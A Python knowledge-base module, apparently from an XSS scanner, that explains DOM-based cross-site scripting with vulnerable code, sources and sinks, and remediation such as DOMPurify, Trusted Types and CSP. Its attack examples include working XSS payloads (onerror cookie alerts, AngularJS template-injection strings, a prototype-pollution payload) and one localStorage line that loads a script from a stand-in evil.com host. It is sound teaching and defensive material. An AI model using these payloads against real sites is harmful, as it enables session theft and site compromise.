#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: DOM-based XSS
"""

DETAILS = {
    "title": "DOM-based Cross-Site Scripting (DOM XSS)",
    
    "description": """
DOM-based XSS occurs when JavaScript code processes user-controllable data from sources like 
location.hash, location.search, postMessage, or Web Storage, and passes it to dangerous sinks like 
innerHTML, eval, or document.write without proper sanitization. Unlike reflected or stored XSS, the 
payload never touches the server - making it invisible to server-side security controls and WAFs.

This is a CLIENT-SIDE vulnerability. The attack happens entirely in the browser's JavaScript execution.
Modern web applications (SPAs, PWAs) are particularly vulnerable due to heavy client-side processing.

SEVERITY: HIGH to CRITICAL
Bypasses server-side protections. Increasingly common in modern JavaScript-heavy applications.
""",

    "attack_vector": """
DOM XSS SOURCE-TO-SINK ANALYSIS:

SOURCES (User-Controllable Input):
1. location.hash         - URL fragment (#payload)
2. location.search       - Query string (?q=payload)
3. location.pathname     - URL path
4. location.href         - Full URL
5. document.referrer     - HTTP Referer
6. document.cookie       - Cookies (if HttpOnly not set)
7. localStorage          - Local storage
8. sessionStorage        - Session storage
9. postMessage           - Cross-origin messaging
10. Web Workers          - Worker messages
11. WebSocket            - WebSocket messages
12. IndexedDB            - Client-side database
13. window.name          - Window name property
14. document.URL         - Current URL

DANGEROUS SINKS (Code Execution Points):

HTML Rendering:
- element.innerHTML
- element.outerHTML
- element.insertAdjacentHTML()
- document.write()
- document.writeln()
- jQuery: $(selector).html(payload)
- jQuery: $(selector).append(payload)
- jQuery: $(selector).after(payload)

JavaScript Execution:
- eval(payload)
- setTimeout(payload, delay)  // String form
- setInterval(payload, delay) // String form
- Function(payload)
- execScript(payload)  // IE
- element.setAttribute('onclick', payload)
- element.setAttribute('onerror', payload)

URL-based:
- location = payload
- location.href = payload
- location.assign(payload)
- location.replace(payload)
- window.open(payload)
- element.src = payload  // iframe, script, img

ATTACK EXAMPLES:

1. LOCATION.HASH TO INNERHTML:
   Vulnerable code:
   const content = decodeURIComponent(location.hash.substring(1));
   document.getElementById('output').innerHTML = content;
   
   Attack URL:
   https://example.com/#<img src=x onerror=alert(document.cookie)>

2. LOCATION.SEARCH TO EVAL:
   Vulnerable code:
   const params = new URLSearchParams(location.search);
   const callback = params.get('callback');
   eval(callback + '(data)');
   
   Attack URL:
   https://example.com/?callback=alert

3. POSTMESSAGE TO INNERHTML:
   Vulnerable code:
   window.addEventListener('message', function(e) {
       document.body.innerHTML = e.data;
   });
   
   Attack:
   targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');

4. LOCALSTORAGE TO SCRIPT SRC:
   Vulnerable code:
   const scriptUrl = localStorage.getItem('customScript');
   const script = document.createElement('script');
   script.src = scriptUrl;
   document.head.appendChild(script);
   
   Attack:
   localStorage.setItem('customScript', 'https://evil.com/xss.js');

5. DOCUMENT.REFERRER TO LOCATION:
   Vulnerable code:
   if (document.referrer) {
       location.href = document.referrer;
   }
   
   Attack:
   <a href="https://victim.com" referrerpolicy="unsafe-url">
   Set Referer to javascript:alert(1)

6. CLIENT-SIDE ROUTING (SPA):
   Vulnerable code:
   router.get('/page/:id', function(req) {
       document.getElementById('content').innerHTML = 
           '<h1>Page ' + req.params.id + '</h1>';
   });
   
   Attack URL:
   https://example.com/page/<img src=x onerror=alert(1)>

7. JQUERY HTML INJECTION:
   Vulnerable code:
   const searchQuery = location.search.substring(3);
   $('#results').html('You searched for: ' + searchQuery);
   
   Attack URL:
   https://example.com/?q=<img src=x onerror=alert(1)>

8. DOM CLOBBERING:
   Vulnerable code:
   <form id="config"></form>
   <script>
   if (config.isAdmin) {
       // Admin functionality
   }
   </script>
   
   Attack:
   <form id="config">
       <input name="isAdmin" value="true">
   </form>

9. PROTOTYPE POLLUTION TO DOM XSS:
   Step 1: Pollute prototype
   merge(obj, JSON.parse(userInput));
   // userInput: {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
   
   Step 2: Trigger XSS
   element[unknownProperty]; // Falls back to prototype.innerHTML

10. ANGULAR CLIENT-SIDE TEMPLATE INJECTION:
    Vulnerable code:
    <div>{{userInput}}</div>  (If template compilation enabled)
    
    Attack:
    {{constructor.constructor('alert(1)')()}}
    {{$on.constructor('alert(1)')()}}

FRAMEWORK-SPECIFIC ATTACKS:

React:
<div dangerouslySetInnerHTML={{__html: userInput}} />

Vue:
<div v-html="userInput"></div>

Angular:
<div [innerHTML]="userInput"></div>

Svelte:
{@html userInput}
""",

    "remediation": """
DEFENSE STRATEGY:

1. USE SAFE APIS:
   
   SAFE:
   element.textContent = userInput;
   element.innerText = userInput;
   element.setAttribute('data-value', userInput);
   document.createTextNode(userInput);
   
   DANGEROUS:
   element.innerHTML = userInput;
   element.outerHTML = userInput;
   document.write(userInput);

2. INPUT VALIDATION:
   
   Validate all DOM sources:
   const hash = location.hash.substring(1);
   if (!/^[a-zA-Z0-9_-]+$/.test(hash)) {
       // Invalid input
       return;
   }

3. TRUSTED TYPES API:
   
   Content-Security-Policy: require-trusted-types-for 'script'
   
   const policy = trustedTypes.createPolicy('default', {
       createHTML: (input) => DOMPurify.sanitize(input),
       createScriptURL: (input) => {
           if (input.startsWith('https://trusted.com/')) {
               return input;
           }
           throw new TypeError('Invalid script URL');
       }
   });
   
   element.innerHTML = policy.createHTML(userInput);

4. HTML SANITIZATION:
   
   Use DOMPurify:
   import DOMPurify from 'dompurify';
   element.innerHTML = DOMPurify.sanitize(userInput);

5. FRAMEWORK PROTECTION:
   
   React:
   // Safe by default
   <div>{userInput}</div>
   
   // If HTML needed:
   import DOMPurify from 'dompurify';
   <div dangerouslySetInnerHTML={{
       __html: DOMPurify.sanitize(userInput)
   }} />
   
   Vue:
   // Safe
   <div>{{ userInput }}</div>
   
   // If HTML needed:
   <div v-html="sanitizedHTML"></div>
   
   methods: {
       sanitizedHTML() {
           return DOMPurify.sanitize(this.userInput);
       }
   }
   
   Angular:
   import { DomSanitizer } from '@angular/platform-browser';
   
   constructor(private sanitizer: DomSanitizer) {}
   
   getSafeHTML(html: string) {
       return this.sanitizer.sanitize(SecurityContext.HTML, html);
   }

6. URL PARSING:
   
   Use URL API:
   try {
       const url = new URL(userInput, location.origin);
       if (url.protocol === 'https:' && url.host === 'trusted.com') {
           location.href = url.href;
       }
   } catch (e) {
       // Invalid URL
   }

7. POSTMESSAGE VALIDATION:
   
   window.addEventListener('message', function(e) {
       // Validate origin
       if (e.origin !== 'https://trusted.com') {
           return;
       }
       
       // Validate and sanitize data
       if (typeof e.data === 'string' && /^[a-zA-Z0-9]+$/.test(e.data)) {
           processData(e.data);
       }
   });

8. CSP CONFIGURATION:
   
   Content-Security-Policy: 
     default-src 'self';
     script-src 'self' 'nonce-random';
     require-trusted-types-for 'script';

9. LINTING AND STATIC ANALYSIS:
   
   ESLint with security plugins:
   npm install eslint-plugin-security
   npm install eslint-plugin-no-unsanitized
   
   .eslintrc.json:
   {
       "plugins": ["security", "no-unsanitized"],
       "rules": {
           "no-eval": "error",
           "no-implied-eval": "error",
           "security/detect-eval-with-expression": "error",
           "no-unsanitized/method": "error",
           "no-unsanitized/property": "error"
       }
   }

10. SECURITY CHECKLIST:
    
    [ ] No innerHTML/outerHTML with user data
    [ ] No eval/Function with user input
    [ ] Trusted Types API enforced
    [ ] DOMPurify for HTML sanitization
    [ ] URL API for URL parsing
    [ ] postMessage origin validation
    [ ] Framework dangerous APIs avoided
    [ ] Static analysis configured
    [ ] Regular security testing
    [ ] Code review for client-side code

TESTING:
Use browser DevTools to trace data flow from source to sink.
Test with payloads in all DOM sources.

TOOLS:
- DOM Invader (Burp Suite extension)
- DOMPurify: https://github.com/cure53/DOMPurify
- ESLint security plugins
- Semgrep: https://semgrep.dev

OWASP REFERENCES:
- OWASP DOM XSS Prevention Cheat Sheet
- CWE-79: Cross-site Scripting
- Trusted Types: https://w3c.github.io/webappsec-trusted-types/
"""
}

